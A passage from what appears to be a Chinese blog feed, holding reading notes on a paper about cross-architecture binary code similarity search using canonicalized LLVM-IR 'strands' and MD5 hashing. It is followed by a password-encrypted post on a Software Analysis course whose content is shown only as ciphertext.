<li>通过重新优化找到等价的代码片段。通过在strands上重新进行编译优化器的优化过程，将代码片段引入新的规范化形式，从而在后续能够<strong>识别语法上不同但语义等价的strands</strong>。</li>
<li>建立代码相似性。爬取部分语料库生成一个统计框架，来评估每一个strand在整个程序中的重要程度。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210924140852.png" alt="20210924140852"></p>
<h1>设计与实现</h1>
<h2 id="二进制代码规范化和一般化处理">二进制代码规范化和一般化处理</h2>
<h3 id="将二进制代码提升为中间代码">将二进制代码提升为中间代码</h3>
<p>这个步骤排除了编译器和链接器的干扰，使得后续工作可以关注于语义方面。该步骤有很多框架可以使用，作者在这里使用了angr的pyvex库将Intel的x86_64和ARM的AArch64指令（包括浮点指令）提升为VEX-IR作为原型。<br>
值得一提的是这一步进行的不只是简单的反编译，而是使用变量表示相应机器的状态（包括内存、寄存器，包括标志寄存器），并用对这些变量的操作来表示指令的语义，因此在这个过程中并不关心任何优化，只需要专注于准确表示语义信息。</p>
<h4 id="指令提升的过程对相似性的影响">指令提升的过程对相似性的影响</h4>
<p>会产生一些冗余和总体上的偏差。例如在图3中将aarch64的&quot;mov x1,x21&quot;转换为VEX-IR时产生了冗余的临时变量t14、t15、t16；将x86_64的&quot;add rax,1&quot;转换为BAP后，生成了临时变量T2。<br>
如在图1中体现的，存在这种冗余的变量在进行相似性学习时是致命的，也会对后续在跨架构和优化级别的比较中造成严重干扰<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210927141152.png" alt="20210927141152"></p>
<h3 id="从提升后的IR得到LLVM-IR-strands">从提升后的IR得到LLVM-IR strands</h3>
<p>为了达到“Lifter无关”，作者使用了一个（自己写的）工具把VEX-IR转换为LLVM-IR。选择LLVM-IR的原因是它的稳定性、辅助扩展工具多且对多架构支持较好。（个人猜测主要是方便对代码进行统一优化）</p>
<h4 id="提取strands">提取strands</h4>
<p>在这个阶段的目标是建立一个过程表达（procedure representation）以便在后续配合找到相似的程序片段<br>
提取strand的步骤：生成CFG，分离出每个基本块，其中strand就是在一个基本块中和某个值计算相关的所有指令</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210928224354.png" alt="20210928224354"><br>
以上是提取strands过程的伪代码，大概是“倒序取一条指令，判断其操作的变量与当前strand中记录的变量交集是否为空，如果不为空则将指令记录到该strand中”。其中Ref和Def函数返回一个指令所引用或定义的变量集合。这个算法在一个基本块上重复执行，直到把整个基本块完全覆盖。</p>
<h3 id="将-LLVM-IR-的strands规范化">将 LLVM-IR 的strands规范化</h3>
<p>这个部分要解决的三个主要问题是：1.编译器造成的strand的语义差异，例如编译优化、运行时库和控制流的影响 2.不同机构造成的影响，例如通用寄存器数量、指令集表达差异等 3.提升器的造成的影响（如前面提到的冗余指令）</p>
<p>解决方案是利用编译器重新进行优化，变相进行统一规范。LLVM-IR对应的优化工具是CLang opt。作者将每个strand作为一个LLVM-IR函数片段，并对代码做了两步更改：1.将寄存器更改为全局变量 2.添加返回strand值的指令。用’-early-cse’和’-instcombine’选项进行了“公共子表达式消除”和“合并冗余指令”。图1(ii)-(iii)中描述的就是这个过程</p>
<p><em>在用编译器进行规范化处理时，strand默认被输出为储存着表达式的有向非循环图（DAG），为了方便后续比较，作者将其输出为线性表达的文本格式。</em></p>
<h3 id="转换为一般化表示">转换为一般化表示</h3>
<p>重命名strands中所有符号，即将寄存器和临时变量按顺序重新命名。这步对跨架构的比较十分关键，因为在给定的计算中使用的寄存器与实际语义无关，并且在不同架构中完全不同。</p>
<h2 id="进行大规模代码相似性搜索">进行大规模代码相似性搜索</h2>
<h3 id="使用strands的MD5值检测相似性">使用strands的MD5值检测相似性</h3>
<p>在比较时使用代码片段的md5值进行比较，这个方能够法减少内存使用且加快了比较过程。对于过程<em>P</em>，将它的表示*R§*定义为过程中所有strands哈希值的集合，即:<br>
<strong>R§={MD5(Canonicalize&amp;Normalize(sp))|sp∈P}</strong></p>
<h3 id="分离出需要的strands">分离出需要的strands</h3>
<p>在对已知序列和目标函数q，t进行比较时，有一个可行的思路是比较两个过程的哈希集的交集，表示为M(q,t)=R(q)∩R(t)，但在实际中这个方法效果并不好，一个原因是一些匹配的strands可能只是编译器针对特定架构等因素添加的语义无关代码（artifacts），例如栈空间访问或编译优化，与实际代码语义并没有关系。（题外话，这些代码可以用于识别生成程序时使用的工具链。）</p>
<p>为了避免这个问题，需要区别出从源代码中直接产生的、与程序语义相关的strands。一个简单的方法是将出现次数较多的strand赋予较低的权重。定义Pr(s)为strand s 出现的概率，其中概率空间限制为①从二进制文件中提升的代码，②规范化和一般化后的strands，记为W和 $\widetilde{W}$ 。<br>
如在1式中定义的，我们定义strand s 的重要性为Pr $\widetilde{W}$ (s)并将其出现在不同程序中的次数除以 $\widetilde{W}$ 里所有函数中出现的strand种类数。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211005012155.png" alt="20211005012155"><br>
因此已知序列和目标函数的相似性度量即为<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20211002183201.png" alt="20211002183201"></p>
<h3 id="用随机抽样来估算strand的频率">用随机抽样来估算strand的频率</h3>
<p>由于计算Pr $\widetilde{W}$ (s)需要 $\widetilde{W}$ ，但 $\widetilde{W}$ 是一个动态增长的值，因此无法简单地计算出Pr $\widetilde{W}$ (s)。作者采用了另一个方案，随机采样获得一个较大的子集P作为全局上下文，来估计Pr $\widetilde{W}$ (s)：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20211002191720.png" alt="20211002191720">（将4式代换到3式将得到2式）</p>
<p>其中P是通过爬取 $\widetilde{W}$ 获得的函数集，因此覆盖了所有支持的编译器、优化级别和架构。同时P作为子集具有较小的尺寸，在后续方法中也能减少内存使用。<br>
注意到此时的Pr $\widetilde{W}$ 其实是一个近似值，因此设P中未收集的strand的f(s)=1，在避免f(s)/|P|产生不确定的同时也做了假设——这些strands在 $\widetilde{W}$ 中极少出现。</p>
<h1>实验与结果</h1>
<h2 id="生成样本">生成样本</h2>
<p>在学习样本上，作者用了多个版本的CLang、gcc和icc从一些开源代码（包括OpenSSL、git、bash, Wireshark, QEMU等）中编译了大约50万个优化级别不同、针对x86_64和AArch64的二进制文件（对应关系如下图），其中有意选择了一些包含漏洞的软件版本。作者从中爬取了一千个函数，用来生成全局上下文P。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211003205831.png" alt="20211003205831"></p>
<p><em>对于全局上下文的合适大小进行实验时，作者发现大约在400个函数后就对误报率基本不造成影响，因此使用了1K个函数（2.5倍）</em></p>
<h2 id="评价指标">评价指标</h2>
<p>使用CROC（Concentrated ROC）来测量随着阈值的提高而遇到的误报率</p>
<h2 id="评估结果">评估结果</h2>
<ol>
<li>与另一个工具Esh相比，作者的工具支持跨架构和优化级别，且具有更高的准确率，在效率上更是明显优于Esh</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211005002153.png" alt="20211005002153"></p>
<ol start="2">
<li>挑战最大的是学习单一架构的代码相似性后跨架构对代码进行检测。因为实现操作和指令的范式不同，可能导致错误匹配strands。同时，由编译器和架构导致的内存布局和寻址等方式的不同，也会影响匹配准确率。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211004223519.png" alt="20211004223519"></p>
<h2 id="缺陷">缺陷</h2>
<p>作者方法的前提是假定了相同源代码编译出的二进制代码会产生语义相同的strands，并且可以进行提取和一系列转化，但这个假设其实不是完全成立的。</p>
<ul>
<li>编译器不同时，控制流图可能存在差异，导致基本块表达存在不同（如下图）。这个问题会使得匹配度偏低。</li>
</ul>
<p>造成这个的原因是作者为了提高效率和大规模检测，把strands的范围限制在了一个基本块中。可以通过扩大执行链的范围来缓解这个问题（当然代价是开销上的增加）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211004214237.png" alt="20211004214237"></p>
]]></content>
  </entry>
  <entry>
    <title>南大《软件分析》笔记</title>
    <url>/24383.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3a222067a3036dd32e0501f2e1d59b2146ecbec0c91cc224786bfcde1c7b1bdc">f11842cbaa61f9f62e9d6892f6519b982ae71f33cea292c443ecd70d3c34c0359c49854c7c64c1b1881579b577e5fbf34146a4dd181e3938c9979a50cc392b88a1bb87b810d30296d53675d741a41ac3e8e6939f1a335dda7613cc0f51939574b8dcb30a2354da8a6415d6e8f45c7881a3816a31d186f17fa7c8208bb2054c0ffcd2d7c21b3d9c6a7ec2ddd7743cdd8526fe5a590adb6fe2daf13373dd1542fc7d246d341ab03313dfe83cf772f822ee362284c8578e3a751c6a4dedbdf6de74d6de9063292e37281c5b59b18e9f842c3ea07651be1407f322d1ac164834f1c756c9475d9cec2e7b3f29b80eb4137da32d3c885515792f0461734761b6d65998000de0dfd6b26b6d446089c0bc148d1c75cd8b4ff95db9fdbcb1431ebe3d9a8f447834438751bf8abee907a0ace8641a4063dd3a865b7bac1c102e59baf19820a6e5639dc97cd7f0840fc9e277885deaed37fc3416736f95162d3c2406c95c38257e255f0c4d94742d334d4b72caa54f88341fc57efb3456cff9ce16e141173d6834b9b59d5ec280c53bab18b56c5a2757d829c20d77fe31144f60a144d11bbc4c3a8246fafc8597ab4c385fa0f5452a915bc2be03e2c8512cc96f674cad51f440512809c8c7f619d86231ea7f2a77f66bd08f87ec6dacdd282ecbadf43d2fcacecf3fa4c5d9b556d5f71cefaa28b243919fff205a3790ae91bd32b5b465c65a78563aa323c959185c241ea92946023ede7e76a2dd2c88663562c1f58f593edb2b9f9a87d5e8ff00a3d78438b18643ca7861fe6d4e4992740d1a61e5cffe5b009ec0871bc3a64912c616def91b90b8bcc8f1a0d2362428d40407f8fde110601b7e66130bc7883d25a709056f21eaa6efd2f2117e074a9cd52c90b0673144401a16a52bf6fd602fa2116de619d894f463be97db53b1523dc1240430425c392b60e579009f20df98914b4df52a7e54e9102f2f0858b63ae6755b08c8ce23d0d2d810c89683e4d60af887ac1c8607ec900538e968327aadf306fd22a006bcf088181f94a694fb687b585c3725e71357e6d8a7289c3fe20f4225d399bdd482781f7c079500ae8a82c5da5f3370abaf7a3b2fe1a274ea0706a69f379cf870a7e47c92be4740708902b9928fe6729caad603316b4c29c66ea745eef99b20ad8c4b29ffac36f70c149b948fa2a493462136c82288432d76a342ea6a4795057abdcca273719447c94ffe9e6f2e21fb571d557becb9a9af2917ff0d0550f5ecd9847a1934ea9e7bd715d05fb3b0b230b6c6f3a3a6344bfa73e62fc4bf57c328a21f23da062f3e675b0958c9d52ae339d5d41e7ab0a167b4eb5a6839ba137a8cb4cefb76e6905c332a8fc61d77d256f22b2e574307ba0cdede4f7f9034944044f5d19a2484c710c53f3a0d79a4245fc8f3cfa0f09437da413732cc8c6b15f1ef8ef5b1fb0e3915dc894c753bd06c0c306eda96f02ef1f352eede336aed1a10433f5d9338c975688ab834bae86e5c22db68810a4a0849e6db99748a3b49b25a67b294f5776bafbf93dba04d32330c76f014376afd4da15d43ba72fb561f8070086271fe00f9df228d1cd581950c56099e255c70f2506181c4ec4d929bd4cd3e23e112a73ed5e0ab679b87a3638530a98e0c8934e381bea3add318414b5b838a565bb51f503c17aaf6cc1a17eacbf6688742413c57040a69e58874528f9e81a19abc711142dea2edf90f00d99652956127f87096067dc8b3704f1dee271d28264ca81a112a73567debe149dd631850df6d1d197c2e8250f32a0fdb2582dab1f7ad078a8b2c22711f789e2cd7638e0f1a9da8f6f163e5dced3b21d6f32c45da51e9ae68080aa581a62a9999e8370343af3eb19c5e3a01f0db4830ae37a856ffee1d77285530769c29e4f7aac1018999d7a1ff96b50e88c2eab312e485d5bd14c10aa82407afa9775e426cc277ecd7a28e9f2e296d950527fdcf3267688e44de25a3681fc18bf26be61fb982d7e4ec1b9c873bc946c512bde41c347b407d06389a74c8339793f2d81271e8e7596169cbbe7f446e05ba3df5f4e6d36947184268dac892810b087d0f31b908c625bf0d336be04d83d54cd82750f446458d37c7b696ad751fc852f95f0379a3d36ef26a0f67476997f85e1212e5039f9d3262e9a66616a4d637d4311575512771dd0444f869a6a3a29246df56779b8d683442e2ff6ab6328d5ca62ecaf3b3b8e8c253bb525f013257fa39fdeb034ec852c18997b6c93208edb77ac6b7f64d87e603c1dadc43589b6615dd7cb55786adea9b76ecfddb33064a01ffb23451415f109be2c825c04631b9b1dca71aab5f07ef44c966595baa049f4a39262a9eeb6bf306c3ff44fc278b34379ec629f66d1b80d0409be19a21bb1585ff5e77a9896a9d5bfc78feab8ef4a4c63c34f83cf6902eff2e3f0a84e4f813846ec01eb03a78245f8b017021868977e22c5adba9d82a98475ba8f93db440e0b85bea8641f1ce4e7477dfc6ab7013252594e379508771139d216958b08c4569234976c0e764ce7250669f21d4ce07cb61aed178fa5f0f1b6962ab717de801682285f30782198e743b7463525e22ef43a98cc8de70c8cedf26cdaf17df52b1894ff173e0cf83007b7cde64a795dcfe3f2ea2ff6e2f62ebe2e52fa7e44e580ffbb1fb0d1a6b7e79718177b06a10f1b9ba30d7586f1e4e23708b56c41e460487af8bc44661a71513240ed48a348d46ca366f54a53d3d77e7077563bb4f56887601468e6a4a2b2399792d43ebc18a725660fa7f532fe6fa668641e808b920b903824d1da6e3f298b878e771d6d7e96ceb600d04ebc7d77aac4da74252f5a4da8a58d80af799cfb5a41ea030fd1c12a179e3c2ce9e7b567ef4abc25184d56fbc3a307e69a824667a308c1aa2cb31ff41c7bb87006f4e970ad7a02f3527450b87964b5c051ad2567d918e8e71b422580547b615038e6af8832866f6c534ceeea97c02060fe44cbafffd589525830d582587157e37ecef7cf4dca0c2d3e9d088b889d7bac52d70d6c043f2a94b8a27b477e33a76161813bc592240b3adc7c10225ddbbf968d7464ee30c67d063777dd72d559e975c24077b45d15abbe07103d7d76bd1c3c27a6f256d491eb4395874d65b1414011763d9dfb00b3b69f311486466a468917cfa2dbb4b1a913a3fbe8bdaf4d1a250b0229361789e79c97ce01fb569ddc1c047edf90504a4deee0cc1cc5841b031c116e4f4974b82a51128e7987afae8ff535996ab377bcbba55dada9e9c89fed214997e54a9863c6d3369aa6bb82c9defca8b21584ea4d92d814d4587429db1d2e5c8329105f14a61412c0c9c73d78ad0017e01cb77778a314aa4ce0eba9c49a129b35cc00d45791c61f30ad41b4a6afac1b7b8f3a3798a5711f4bb625b43364cb870a1a3312230758e04ffff41abc9b5ca24d8d072356156de13ca19ec568386669a4deee7a260f377f2dd9541023e9d7735484baa46ebd4d8f7dd7607b0efdd4d27b99b6f3952d6e0b04bb3689e1b83c7bebe935641e57871aa1aff01b5405ba502f6071e9ed81edc79865ef57c658d88c42b9ec301132f0649acb4f9d78b6f65f2b139de71f2189b36c75a4ee4026d02fea899e696a1a36f48e507d8aafd1eb7b8902c2d576cba22a5ffc1fcae3084f06b700030117a674f6800b65bfad8accfc8d49871194d31572c0c3a0370c02bb892566c66fd36b5c55276e4ed79075b873679927ebbc12337c1d41bf79739858bb275754812ad42f9ed2e7b86dcf426e0bd4e67786ce3b086fb95c100154fbb1e58a7fd517be7cebee70c172d9517e8da56c257034d58899b0f08a30c3a3e3bfe92c9b1a20d9313f7c08cfece80eb1c7fa4f6700403c46e4db576808ef86778dca5b09c0e2ffac286bf98e3d21f39600c1b3b6b3c6c83da0e97df5349c9a26a3be0a94e0849637934ddf3e4f97d449dc9effa80b0ac82cb7728c7398ac81e1c74deec51177e11d52976768a32c895c9fc91c73e2db7aa08b74fbb735757e2dac3970a0c9a6bc87af82c502ab3bbf9417de9e7e2fea1ec249e28cd787f151debdc2fa68082575c53ca0d397c397d9cb12fe5bf48829411f3f3f22117e85bae6fc2594a80481b7124e07d5fb937872814b058e4f0c700b141e7b88bc8dc0dd9597aba7ac4314fffcf2d2f7b2270b5beccc3cad5c7f989b500164809c96e2a1ccf95e1c1e1caf7955f3b142d4b95b2309c7dd50898797d45bb858f16f55aeeb45206ddc83c2c747eb683f2128ed14f5638604dfa7f196bc41645fe4c51d2d3041ca2689a003b764d9f969373d893c0a168a6402d1e8abe44af0dabe4da69550f1485d4f6fd683c5e1fa9e8b5e192c2ed2ca97e906617a1b5f4757024db5014af4a5aecf1cf262d070cfeebab393c4fe9306765b0f5899ec549f0959747ea23e5019c38c1d0955e964a96d40a1dedd996ec7e163e5b11390279f7958a87a1deda45f49460ccdab8b07cf95c7072506c59f8b7d868727dab6a40554fbc12318dbc9cd3dea2e66376710875f50afc50ea00401f1558589f9fb9a21aaabbbef0e0c5cd7b1fed8dcd3804898b399703ccd168f73aa05ef441f72cac649d78059113b674213fa99a2bebcaf5bd8980f7e308ce6d09a222709af82b46705d51e9e20545f0bee75975ff5e73f6ab65ae2d6badae3c58aa021c01f4d9922c2544304ecae774ab5ced967513f3761dc31aabcff901d9e8945212f53943626356f3267e279c66e0c0f1224f374fe734860927ba10f9024584167de20df2181f569124c28d97863a62f5ad03702f24bee9b17e98ebae691c4c6ffcaba3c964ccbe2a0cfb22c5f6961f98293d9cef835659951cd6ae63f3367d42dc913f83c5415c064e58c67a4df59e9a1c31f8fadfee424a497d4c2ab5cd4fef25fd271e301a9a6a534db6f1a78b6219e10b5e0dcf8e5a709580f47d511320c7b52f447439e65a61f237fc98cdf37a717a599889bdb669e926a9bad3fcf5f0439d81a8654d5c2cdc2c044470461b8b45a838884ea41dc6dcb573a8dcfab1c797ec610bd228a27b3d0fde8eec118baf3a3453b188f519e12ec7a42eef9200ffaf1f014107f90b6ba358691737a36ff2284b43a28b28c1aec2cfdd42ec06050f46dae5934b5094f12fb5baef78fb9e450007eb0cc60f5b8fae7a2d462d2842fd08169eef9e0ab4effc9109b336e10b1cceb4e102711ca178707a2133aee7e163f3a3a25aa8fbca867fa1c8946f4666f26bc6e730a268657a90fb0f4acff298ab2941360ccea0317eda33049adc6ddac5a475b6fce6e6f212ddd8caa17d120f33796d625102fa3acf0f9893cf79f0f06ed69012cdc65cad8d32551f3107150eec10dc6f2197483fd9bf4cbf3020c53c57fb6047eb152f3b63833a687d2198030a35409ae23b479038ecc004ba3f155ed7cb6942ccd55d1861c691beb2aa83f9764f65da49e4a26166d6cbb96e7d8621a9fb856b0fdd3f01fbabb46e4d785fc860fdf64c9ab33d3d40936379dce095c3e226d52f86c39468c357371e2c39550f190a3590b5e0f1d3297cb06eef456d22a49b7305d878fd3ac71523840b354944821bdfcf8de333679a19a2cb74d2200c176651a909f5b99e6c17646b08dc2a406b838393f41db82dc793ffe87a377193ef4164a5a00c9127311133908b70d793391647fd9dcfdb6fcc5db04c03a2c19dc382b7c0a2802cb7952c9b17c794686bed8cd6ada5ffc6a02a85250fcded5b92a1f0b67f3c7789598aac784e759d809913693bc8f8fe2794eeceb0a3808d5a7a57dc3f0be418a0d4903bd04d87046ac3a4aaf436540b3f836c1e3fd094e90948b09d61848857cb1402a08f391389cd5863f3547b0bf05283fcbe29d7356f07b2879ee1aa48fe835cf7dd09205f2d41bfdd1d46f564dfcb9d27167d92b73b07be08e7032c8351111e1023a1c623cfee8883a6bbbb86b9643b32ba8c70f5f9b27f3b50adba5546857ef4f21df41392a80895d287023cf03d42808d4819830176086656bdbf939dcc93fcef7870cf7e28cd71675a693e09861e4d75d53151f49fbc368a072fe0c9cfe25f4447234b19cb4a32b3557f25249f8025c8153b2c0853ee45a3bfdc425bec5f82fc7091f12553e776e37946cb8df2a0b5ac1f7e49cd444f25cfb40ec8597e651b12d1306df35619fe82245f595d11e7ebd63d1c8f4699348751642a2961b1151380888ada0f24a5620511e6fc91482525139132c83936b368963b6ea330872f1e94fde0d9c93747c3711a11b29f45ca6cb0939a735ff2f309406d74902b3723a15ad8e2cceda446cbb329bf9bc275955316626e6782c4889d57d2fd4f6929eb69e482d78029b36989ab54baba09a3e6086955393d41d41eaf7286e18c4ad74e0d64ed310201cfd8762a851b4be6fdec1d4a800392acb494d5929aa06d15ae80dec36d16850f91aa0d7408942025bba41009f59400a2df98c206673113ee4374bbf14892ea861095b9a63ad6a5974676daa7e2c96df16f8c040c7370c59538e685925bba188ed64b396fc741f98b027a718c8d9ecdf557e46ba50bffe92cc856ec010f46f338dc500066f69ed62170b3fc96d17fdd5db4c1cf3fb337cfa4cefdf329ba4a96c761397699f878f2eeb48130dd2a29b2ddeb99b0747ec86f37250621f7089af5420c117029e01b8da646fb792c556d33730755ac7faf6731e79de56a8c7599d6b55fe3216a0f24143239ada8656060df05d254dbe06e6e0c1680c953e2af34bc2809a3e8cd8a986de879663cbf5fddab4ef638dd60e559c13197723dfb0f94ec749d44a9fb96287a645f5027d9334ed9dd3383c5e31cdb54282608080d3a95cb14b5965bb8de2b90ae7d5b408df1019eeb02ffa55d0f81dd059a8a4611d7238f5193e5e5aa1528bd4471d4a8ed9b47028e098a47c15dc569373ffd341e17bcc454a4f9b73ac6cd4948a7a179a8f2c7c822c2ce4a311267a6f46870252430568671b9fce9304934ce4d2461071a0f3c658b2c8212bf3631bcb812bb7e449909aec29b2333716048240fa36861de19f958ee64f6da9b7276eb17d21ec0768eb64311acb5ba42c80bfc59e20123f6c21e8daa4be83ea382b1f9b64debcd66efaaa4670c6e22b4645512cc343849ef73baf40f8346d4c63d8c0213210e7489a94b6b92ccd9a16f28e1612e8923698eb79327c3dafc9a28099e458c68b2eef7bdc9c4d67461c819450c437fd8862d25be74ff29e0ef586c298e4476df5ebf1561e7acfe37c7ba675e09db80daf6a02e5172fbd2b2f4a76b47235c902d77a2a2abbb4888cfba4760e34aaa1d44d994ca09d9814ae1d9b3bd04e1982b750bbfdbd5176b844c0df5cf319ea7ce071386f2ab6d67b52d23997bebc9d570029123b8c01a259123fcab21638e08ae05bd7c6f3b447bf9caaeb181e0dc4c5a430601e83a024fec9b92bc536fdca3a88b4fa035efaff7b78e5f69a97a7b6de5046fc240028fe1d82ac55b935993758bce1c63882151b8f629f862007e8dee9816d6c19d649d789f840fd64b4cad734fc847b57d2e1bb651cb71f9f00eaa426c4b8f899270bd23820fa0999fbba5cd2e048ba86a5dae4ae6cb094b30b12b7a97919bd5b135dcd980bed659d9dc55d3fc7479a8e7b830cf6b27cf8a2d7456e573987605efa92c75ba235f5785034a96a9df4d1db2e6719e70f239d4a6171f37b4ffebf6fc76526cd0e41f50ddcde457e6c0016e328d9270ccc6866668654b03dd962847665c36523454378321c26aa2d7e7a5c677dc392bb2439f8600dc23c800c6964bfcbf9f32a06e2ca442e3ac55401da70aeca86edf74f3fd2894e11a74e84dcad5054e7eee94bb1ef1ec2c7d5962b1ef4baba3b167a812bcada1f81d67305d3fad20af59be8428b3267bb4316e5ea6ae3c1cb4d15e26c6ac57325f218313015385e72f203b7424b2f732ad2f35beecb12a405e9d888439229c06d41e7133af3ea9cde5af77e4d3ec27b3d5faae833c5e78404ef4ce04b10b20735da8487d59b4bbffbf4e7f43be445b729f5fbd0ee741076f6fa1598da57e36c79198cb934f98daa1b2fd698b5355aa722eccc8ae7facbc3b24a379987479b51bc5fb62bd230379d32cc3928b6a9d10ec3d6845519e6de75ef5423bc492c2279c3528ecb5625d5fb8bc926640dfea779e6f7bb19e66bb80e4f4c21375608d34929f5e69b0424084747c411b1a8a52b4a3d44f8de0cd433345ac466cec965dbadbef2086780a61236ac3faa2c0487031b051285b6ed40682f5a58272168acf3a388ccce8405713313d19a6b7d855958260a515a9b3d49ef8b943ef93ba7839cd9d942c23f67ed803df0b167d01e1af49c93ed7bcaa11c1a265190dab961eddab58ee04dd23b04bf032f9d58c32af127efbba443d5e3d373c959df4e7795da6395cd8bd978ab90c2a4409dd7633c49a98fe9fd2ebe46a996155af67acede341b7e330c12c0c2fe36a6f93f6dffd27bdb1f4f31eb043b7ad6fbbbdd7bf3c0c6c0652f2c1df1077a422a9bc0098e59fced02e30944a3bf35844a95cc90dec4283b29a5620c2feb8c10c48f421d7a3f545b6a8b790245ef30b74ac0a4f89da84bea6717e4be9bf2697caebb6458b210803c776065a92a53d399fd417ba7c371bf4e3f4870977e62cbe9b00322d2c8f71541a3699bf213bc937fdc53f5af705da30d52c891cf524f3a3f2127b930c503c3dcf95dfda60cd21ee8c554c76115b9a53ff13354494a26aa868575b2e78aa4e08823a6fc97c1754a3edc37799e27d889ca2ea6c189ea456081495ce256796c8d646233a3bbfade91de8d5300a49a2b0689f20fc4f783d00eb770f059db1c6b8bb72e57b2b8be8c59ef1885dd05853a2931a2cc9a0a853ff502f8ac7ec9680742bb537d21a10998806d4560c156f968595ab485d8808628f9d5cf8975e071ee194e24339358e2672a4e6b35e5eacfa03730df9a4e22fca9f42300ef2690cdeafa997e152c3000b722d6916f12c43afec8234c3a73c9e3fedeb9fa2f29e0631a509275a74b653fa28fca6b4aee3a725e944c05927234644c655393f82d5c2d895903d8cde8bc6b41af84bac7320ae3c638f95f2b2eb6eda54c60be6d5c2fc5a8508baee11613bb0848145f115b8b61724947b96179a2110d9fc239c4c1a9dba44034a83a4ccd2e837159d6c9e6d96a66a774e47fabf52b8294657e531a990ead70b53545a6ed096e3a92fb4c16ab5dcf65262fed22731c42323d635886737fd8b8bbb415755880582d20cf8ebf3100c68b483b946f8aeec24a6f867d5046567c87eec5ae6dcd738ba6a1f480a5680fca8270374fe88580910932c3d7a49da6bb050d31381b5c19daa3241482bc7b1f903cee7f6790273bccf3884d32bd38b95435309a273892dcf4f0b961675c1df31595f083c960102913025a72cba9adbdaada1d3e13056341dc4c9afe45df26a99a797b3e99b48a03e16c199060c29c4bf08962bae332d5008de7568412aac8d332a286e270ccfe3633267b7079d4dcd0e4d1ebec588c0719aadb75bceba3801de2e8a15c2f2cf54f5df110802212366ba822e37a7490164fdd09bb1ccdde5318a9a9e34907239cbc73d626de94cc29aea60ec65ede6b8e93d6d0ba0e710cf56ab08c81d773c3c080629aa5578b18cd906da429fa6cddaf0a5a37003f30a8f7e1aab98fa30fcd425e568f1c05a118613d8b3da11f85994032436c6619855f842ce2efe88ddad2cedee68e3bbd633a0417aca1941c33aa696ba867f7384616b409291f9819a98e03e5f8785047dce0f2c069001fa63eca5c7d945a6f6b4b5c7310cc357ed42b08e554aabcb1c66b833e9c4aed9d9e58bf318acb4c673e8c72e8ef2dc94c26afe2ecdc5341eea90d123efdb921f3bebd463126f93096cbe2d086b5db4c77388cc6ea652a958a85722a97a6e60630a0f12af049c3ef6c9b159fdca21550ded9eb079af6e7f5cbde476e92298a505d472316d5accb932d806a3a9ad43be50f6db13051e85d91facdc814b0fa34d6cff559c4dad89a88c4f93fae4dbfa6f18f0d31453e7761fd70f29a6b8365fdc8971487287f892708e5579986940ce8650b1460b2db08e1c2bbe382db875dae17bc469322905012be14b65a63e685434a047c697f0c7257c2b4f6f41543818f6e884f32a5336750073cabdab121a57b6c0f85ce4004568f9287a9208bc59c144dbe6710be4ce80b4370cef93ca3cae23f2a960926e54a7eaf4e44fa0a98f85ff7e7cc38e8839dfc452a79d18eb582ff25a512a07886e7ec1dfe1f2baae37fb7919e27e5912ec26c9ea71c3da33ace5990718775c67ea6b599bf8e63ca7da756f98bad6d654ad6a7acb8d267972c524c6244470ae3baa4162894ea78d391cb16f25b7bf25350366c94439e1e6ab3f895db47556f2705068641d5d18dade14b4256cfbd6ce08415acb2a30fad298346960d0625b6679cc4795f79c2f3b4eefe8f970ef96ec0cbedf40bcc990dcc38f2c9470c938f1c88facf2eb2fedb9b22f10e0831c656ddade7c6a3608ddc791dca4e56b364a22ac43da008c58ad539372f7c11581a875a0abb280b08a22ee9b69ee477e39bfb22ad8451159244bfa6cf17a0007a8b218a893edb0b3729bd30ab35774819fc5900f889b9789b32115aa85bcb5aa82194c415f54049c882b6abbcb943fc371f3c0d836a98c3f074809ff3591aa16c982fadc02bc57647777971fc322c72da0d53fe04836a2e2c52c7e814319c5889d8f498571da31e74f5518acde11c14c325c559da1cf858729eeb89adc7a6f6b1c066abf1163d22576c63c92d560ca03fc1ba62ed70dac795a0e3cf1294e33c53348b641cd0ccf8b861cbf770701afaa59b4326b784f2c0c43ca27dc9bb0402aeaf306a41adcff1af262def1d06e6794f31ed5f8a5c21831c8ba1fa1da0786189a07c7c20653b307a825eecd5d461ecc3858e885ae475fc7ea00b02e13b067ec263ca489d3ffe7e79aaf42396884e20518e7f37ab217f0dc00bc2614b9803989438f9c01e047f171de2217c4ea7aa3b41e6530aec5763956dcccffb10c9eccd5af3f72a7c3f00e876f6532aba37e198e7d026ef0a46782a6a831e28bc8d4fb21c31fefb8e172c79b2ed5014ac0c26651555802185d3e0b97e135da6eaba0d8b9c2253ee6036f4dd44a0b6eeb150d6d43e2b2461485d50d8bb1f867b1af046255a1f940264ae7abc6532fa6506c5a5d40bdc108c98883b7d69f6a8cb9861cf4ae3116e083cfe980f9d50d64fc8241246793868f8797f2bcbfd5c88d358db9f10ad49cac351043691fae6ac59f99fafea8cf6b256b96f4bd7200c26543757c9922a561a7b99498ea42d4080a1cfe0cda3892ba7cc0d7683d4f58cf3f4b2c91fd52ec1a730e8b75a3b821143fb2cbaa1d74917d6bcaba8cc51c1dde418ee16159b0cc2eb1f1154d0f15d5acdf8db2b4a8b08dcd795bd42fc1edd1613592dfa4a27274cd099c53b6299ffb794c10c87db8627162851ed663d32c944139901b834621d85a763772d0c3a4c325bdc70ffe6a1e784e7d641361a82c72c22448f9464b252a15ee2a196591a23f18cd4d006b243654e25d22fc1718da748e9167234313b88e1d05fa5d96cb37959f76b01348d35e85eedd2ba8ccd886ca1f831a678a1d4bcb65fcb8f1e406287d0479847e04511dbca99f4fe15eb9d5d3a5559bfbfff460d11539bf7995df10483b842771b6a009646f